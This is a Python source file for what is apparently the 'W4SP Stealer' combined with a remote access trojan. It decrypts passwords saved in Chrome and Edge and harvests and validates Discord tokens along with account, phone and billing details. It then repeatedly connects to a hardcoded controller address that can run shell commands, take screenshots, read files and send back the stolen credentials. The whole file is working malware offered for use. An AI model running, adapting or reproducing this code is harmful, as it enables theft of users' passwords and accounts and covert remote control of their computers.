from glob import glob
from unittest import result
import pyautogui
import os
import random
import subprocess
import socket
import base64
import cv2
from PIL import Image
from time import sleep
from colorama import *
import json
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime
import PySimpleGUI as sg
import threading
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps
import re
import requests
from Crypto.Cipher import AES
from colorama import *

while True:
    sleep(5)
    #region stealer
    try:
        results = ""
        passwords52 = []
        FileName = 116444736000000000
        NanoSeconds = 10000000
        def ConvertDate(ft):
                utc = datetime.utcfromtimestamp(((10 * int(ft)) - FileName) / NanoSeconds)
                return utc.strftime('%Y-%m-%d %H:%M:%S')
        def get_master_key():
                try:
                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                            "r", encoding='utf-8') as f:
                        local_state = f.read()
                        local_state = json.loads(local_state)
                except:
                    # sg.popup("Error","Chrome Not Installed")
                    pass
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]  # removing DPAPI
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key
        def decrypt_payload(cipher, payload):
                return cipher.decrypt(payload)
        def generate_cipher(aes_key, iv):
                return AES.new(aes_key, AES.MODE_GCM, iv)
        def decrypt_password(buff, master_key):
                try:
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = generate_cipher(master_key, iv)
                    decrypted_pass = decrypt_payload(cipher, payload)
                    decrypted_pass = decrypted_pass[:-16].decode()
                    return decrypted_pass
                except Exception as e:
                    return "Chrome < 80"
        def get_password():
                master_key = get_master_key()
                login_db = os.environ[
                            'USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
                try:
                    shutil.copy2(login_db,
                                "Loginvault.db")
                except:
                    # print("[*] Brave Browser Not Installed !!")
                    pass
                conn = sqlite3.connect("Loginvault.db")
                cursor = conn.cursor()
                try:
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = decrypt_password(encrypted_password, master_key)
                        if username != "" or decrypted_password != "":
                            # print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 10 + "\n")
                            uhbiore=f"{Fore.GREEN}[+]{Fore.WHITE} Url: " + url + f"\n{Fore.GREEN}[+]{Fore.WHITE} Username: " + username + f"\n{Fore.GREEN}[+]{Fore.WHITE} Password: " + decrypted_password + "\n" + f"{Fore.YELLOW}={Fore.WHITE}" * 10 + "\n"
                            passwords52.append(uhbiore)
                except Exception as e:
                    pass
                cursor.close()
                conn.close()
                try:
                    os.remove("Loginvault.db")
                except Exception as e:
                    pass

        get_password()
        stringvar = ""
        for i in range(len(passwords52)):
            stringvar = stringvar + passwords52[i]
        results += stringvar + "\n"
        passwords52 = []
        FileName = 116444736000000000
        NanoSeconds = 10000000
        def ConvertDate(ft):
                utc = datetime.utcfromtimestamp(((10 * int(ft)) - FileName) / NanoSeconds)
                return utc.strftime('%Y-%m-%d %H:%M:%S')
        def get_master_key():
                try:
                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State',
                            "r", encoding='utf-8') as f:
                        local_state = f.read()
                        local_state = json.loads(local_state)
                except:
                    # sg.popup("Error","Edge Not Installed")
                    pass
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]  # removing DPAPI
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key
        def decrypt_payload(cipher, payload):
                return cipher.decrypt(payload)
        def generate_cipher(aes_key, iv):
                return AES.new(aes_key, AES.MODE_GCM, iv)
        def decrypt_password(buff, master_key):
                try:
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = generate_cipher(master_key, iv)
                    decrypted_pass = decrypt_payload(cipher, payload)
                    decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
                    return decrypted_pass
                except Exception as e:
                    return "Chrome < 80"
        def get_password():
                master_key = get_master_key()
                login_db = os.environ[
                            'USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
                try:
                    shutil.copy2(login_db,
                                "Loginvault.db")  # making a temp copy since Login Data DB is locked while Edge is running
                except:
                    # print("[*] Brave Browser Not Installed !!")
                    pass
                conn = sqlite3.connect("Loginvault.db")
                cursor = conn.cursor()

                try:
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = decrypt_password(encrypted_password, master_key)
                        if username != "" or decrypted_password != "":
                            # print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 10 + "\n")
                            uhbiore=f"{Fore.GREEN}[+]{Fore.WHITE} Url: " + url + f"\n{Fore.GREEN}[+]{Fore.WHITE} Username: " + username + f"\n{Fore.GREEN}[+]{Fore.WHITE} Password: " + decrypted_password + "\n" + f"{Fore.YELLOW}={Fore.WHITE}" * 10 + "\n"
                            passwords52.append(uhbiore)
                except Exception as e:
                    pass

                cursor.close()
                conn.close()
                try:
                    os.remove("Loginvault.db")
                except Exception as e:
                    pass
        get_password()
        stringvar = ""
        for i in range(len(passwords52)):
            stringvar = stringvar + passwords52[i]
        results += stringvar + "\n"
        def steal_browser():
            global results
            return results
    except:
        pass
    #endregion stealer

    #region TokenGrab
    DETECTED = False

    def getip():
        ip = "None"
        try:
            ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
        except:
            pass
        return ip

    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    temp = os.getenv("TEMP")
    Threadlist = []

    class DATA_BLOB(Structure):
        _fields_ = [
            ('cbData', wintypes.DWORD),
            ('pbData', POINTER(c_char))
        ]

    def GetData(blob_out):
        cbData = int(blob_out.cbData)
        pbData = blob_out.pbData
        buffer = c_buffer(cbData)
        cdll.msvcrt.memcpy(buffer, pbData, cbData)
        windll.kernel32.LocalFree(pbData)
        return buffer.raw

    def CryptUnprotectData(encrypted_bytes, entropy=b''):
        buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
        buffer_entropy = c_buffer(entropy, len(entropy))
        blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
        blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
        blob_out = DATA_BLOB()

        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
            return GetData(blob_out)

    def DecryptValue(buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass

    def GetBilling(token):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        try:
            billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
        except:
            return False

        if billingjson == []: return " -"

        billing = ""
        for methode in billingjson:
            if methode["invalid"] == False:
                if methode["type"] == 1:
                    billing += ":credit_card:"
                elif methode["type"] == 2:
                    billing += ":parking: "

        return billing

    def GetBadge(flags):
        if flags == 0: return ''

        OwnedBadges = ''
        badgeList =  [
            {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
            {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
            {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
            {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
            {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
            {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
            {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
            {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
            {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
            {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}

        ]
        for badge in badgeList:
            if flags // badge["Value"] != 0:
                OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]

        return OwnedBadges

    def GetTokenInfo(token):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }

        userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
        username = userjson["username"]
        hashtag = userjson["discriminator"]
        email = userjson["email"]
        idd = userjson["id"]
        pfp = userjson["avatar"]
        flags = userjson["public_flags"]
        nitro = ""
        phone = "-"

        if "premium_type" in userjson:
            nitrot = userjson["premium_type"]
            if nitrot == 1:
                nitro = "<:classic:896119171019067423> "
            elif nitrot == 2:
                nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
        if "phone" in userjson: phone = f'`{userjson["phone"]}`'

        return username, hashtag, email, idd, pfp, flags, nitro, phone

    def checkToken(token):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        try:
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
            return True
        except:
            return False

    INF = ""
    def uploadToken(token, path):
        global hook
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)

        if pfp == None:
            pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
        else:
            pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

        billing = GetBilling(token)
        badge = GetBadge(flags)
        if not billing:
            badge, phone, billing = "???", "???", "???"
        if nitro == '' and badge == '': nitro = " -"

        data = {
            "content": f'Found in `{path}`',
            "embeds": [
                {
                "color": 14406413,
                "fields": [
                    {
                        "name": ":rocket: Token:",
                        "value": f"`{token}`\n[Click to copy]({token})"
                    },
                    {
                        "name": ":envelope: Email:",
                        "value": f"`{email}`",
                        "inline": True
                    },
                    {
                        "name": ":mobile_phone: Phone:",
                        "value": f"{phone}",
                        "inline": True
                    },
                    {
                        "name": ":globe_with_meridians: IP:",
                        "value": f"`{getip()}`",
                        "inline": True
                    },
                    {
                        "name": ":beginner: Badges:",
                        "value": f"{nitro}{badge}",
                        "inline": True
                    },
                    {
                        "name": ":credit_card: Billing:",
                        "value": f"{billing}",
                        "inline": True
                    }
                    ],
                "author": {
                    "name": f"{username}#{hashtag} ({idd})",
                    "icon_url": f"{pfp}"
                    },
                "footer": {
                    "text": "@W4SP STEALER",
                    "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
                    },
                "thumbnail": {
                    "url": f"{pfp}"
                    }
                }
            ],
            "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
            "username": "W4SP Stealer",
            "attachments": []
            }
        
        clean_output = f"""{Fore.MAGENTA}[@]{Fore.WHITE} Found in {Fore.BLUE}{path}{Fore.WHITE}
        {Fore.GREEN}[+]{Fore.WHITE} Name....: {username}#{hashtag}
        {Fore.GREEN}[+]{Fore.WHITE} Token...: {token}
        {Fore.GREEN}[+]{Fore.WHITE} Email...: {email}
        {Fore.GREEN}[+]{Fore.WHITE} Phone...: {phone}
        {Fore.GREEN}[+]{Fore.WHITE} Billing.: {billing}"""

        global INF
        INF += clean_output+"\n"

    def Reformat(listt):
        e = re.findall("(\w+[a-z])",listt)
        while "https" in e: e.remove("https")
        while "com" in e: e.remove("com")
        while "net" in e: e.remove("net")
        return list(set(e))

    Tokens = ''
    def getToken(path, arg):
        if not os.path.exists(path): return

        path += arg
        for file in os.listdir(path):
            if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                        for token in re.findall(regex, line):
                            global Tokens
                            if checkToken(token):
                                if not token in Tokens:
                                    # print(token)
                                    Tokens += token
                                    uploadToken(token, path)

    def GetDiscord(path, arg):
        if not os.path.exists(f"{path}/Local State"): return

        pathC = path + arg

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])
        # print(path, master_key)

        for file in os.listdir(pathC):
            # print(path, file)
            if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        global Tokens
                        tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                        if checkToken(tokenDecoded):
                            if not tokenDecoded in Tokens:
                                # print(token)
                                Tokens += tokenDecoded
                                # writeforfile(Tokens, 'tokens')
                                uploadToken(tokenDecoded, path)

    def GatherAll():
        'Default Path <0> ProcesName <1> Token <2> Password <3> Cookies <4> Extentions <5>                                  '
        browserPaths = [
            [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
            [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
            [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
            [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
            [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
            [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
            [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
            [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
        ]

        discordPaths = [
            [f"{roaming}/Discord", "/Local Storage/leveldb"],
            [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
            [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
            [f"{roaming}/discordptb", "/Local Storage/leveldb"],
        ]

        for patt in browserPaths:
            a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
            a.start()
            Threadlist.append(a)
        for patt in discordPaths:
            a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
            a.start()
            Threadlist.append(a)

        for thread in Threadlist:
            thread.join()
        global upths
        upths = []

    GatherAll()

    def steal_discord():
        global INF
        return INF
    #endregion TokenGrab

    SERVERIP = "192.168.178.21"
    SERVERPORT = 3009
    BUFFER_SIZE = 65536

    help_text = """Commands:

        # Main Commands
            [close] exit the controller
            [info] show info about the target system
            [whoami] gets username and hostname
            [shell] spawn a system shell (type exit to exit the shell)
            [recon] fix connection erros (outp of an old command) 

        # File/dir Commands
            [mkdir] (name) Creates a directory
            [rmdir] (name) Removes a directory
            [cat] (name) ouputs the value of a file
            [pwd] gets current directory
            [ls] gets the files/directorys of the current directory

        # cap Commands
            [cap] Captures an image and saves it as file
        
        # special Commands
            [steal] Steal Chrome/Edge Passwords & Discord Token+Info
    """

    payl = "<octa::101101::>"
    while True:
        try:
            sleep(4)
            s = socket.socket()
            s.connect((SERVERIP, SERVERPORT))

            info = os.getlogin()+"@"+socket.gethostname() + payl
            s.send(info.encode())

            shell = False
            while True:
                command = s.recv(BUFFER_SIZE).decode()
                command_split = command.split()

                command = command.strip()
                
                if command == "recon":
                    continue

                if shell == False:
                    if command == "close":
                        break
                    elif command == "info":
                        output = info
                    elif command == "help":
                        output = help_text
                    elif command == "shell":
                        shell = True
                        output = f"{Fore.BLUE}[*]{Fore.WHITE} Spawning Shell!"
                    elif command == "pwd":
                        output = str(os.getcwd())
                    elif command == "ls":
                        output = str(os.listdir())
                    elif command == "whoami":
                        output = subprocess.getoutput("whoami")
                    elif command == "cap":
                        try:                        
                            file = f'{random.randint(111111, 999999)}.png'
                            pyautogui.screenshot(file)
                            img = cv2.imread(file)
                            string_img = base64.b64encode(cv2.imencode('.png', img)[1]).decode()
                            os.remove(file)
                            output = string_img
                        except:
                            ouput = f"{Fore.RED}[-]{Fore.WHITE} Could not capture Screen!"
                    elif command.startswith("mkdir"):
                        try:
                            dir = command[5:].strip()
                            os.makedirs(dir)
                            output = f"{Fore.GREEN}[+]{Fore.WHITE} Created directory!"
                        except:
                            output = f"{Fore.RED}[-]{Fore.WHITE} Could not create directory!"
                    elif command.startswith("rmdir"):
                        try:
                            dir = command[5:].strip()
                            os.removedirs(dir)
                            output = f"{Fore.GREEN}[+]{Fore.WHITE} Removed directory!"
                        except:
                            output = f"{Fore.RED}[-]{Fore.WHITE} Could not remove directory!"
                    elif command.startswith("cat"):
                        try:
                            file = command[3:].strip()
                            with open(file, 'r') as f:
                                data = f.read()
                                output = data+"\n"
                            output += f"{Fore.GREEN}[+]{Fore.WHITE} Done!"
                        except:
                            output = f"{Fore.RED}[-]{Fore.WHITE} Could not read file!"
                    elif command.startswith("cd"):
                        try:
                            os.chdir(command[2:].strip())
                            output = f"{Fore.GREEN}[+]{Fore.WHITE} Set directory to {str(os.getcwd())}!"
                        except:
                            output = f"{Fore.RED}[-]{Fore.WHITE} Could not set directory!"
                    elif command == "steal":
                        output = steal_browser()+steal_discord()
                    elif command == "empty" or "empty"*2 or "empty"*3 or "empty"*4 or "empty"*5 or "empty"*6 or "empty"*7 or "empty"*8 or "empty"*9 or "empty"*10 or "empty"*11 or "empty"*12 or "empty"*13 or "empty"*14 or "empty"*15 or "empty"*16 or "empty"*17 or "empty"*18 or "empty"*19 or "empty"*20 or "empty"*21 or "empty"*22 or "empty"*23 or "empty"*24 or "empty"*25 or "empty"*26 or "empty"*27 or "empty"*29 or "empty"*30 or "empty"*31 or "empty"*32:
                        output = ""
                    else:
                        output = f"{Fore.RED}[-]{Fore.WHITE} Command not found!"
                else:
                    if command == "exit":
                        shell = False
                        output = f"{Fore.RED}[-]{Fore.WHITE} Closing Shell!"
                    elif command == "empty" or "empty"*2 or "empty"*3 or "empty"*4 or "empty"*5 or "empty"*6 or "empty"*7 or "empty"*8 or "empty"*9 or "empty"*10 or "empty"*11 or "empty"*12 or "empty"*13 or "empty"*14 or "empty"*15 or "empty"*16 or "empty"*17 or "empty"*18 or "empty"*19 or "empty"*20 or "empty"*21 or "empty"*22 or "empty"*23 or "empty"*24 or "empty"*25 or "empty"*26 or "empty"*27 or "empty"*29 or "empty"*30 or "empty"*31 or "empty"*32:
                        output = ""
                    else:
                        output = subprocess.getoutput(command)
                message = output + payl
                
                s.send(message.encode())
            s.close()
        except:
            continue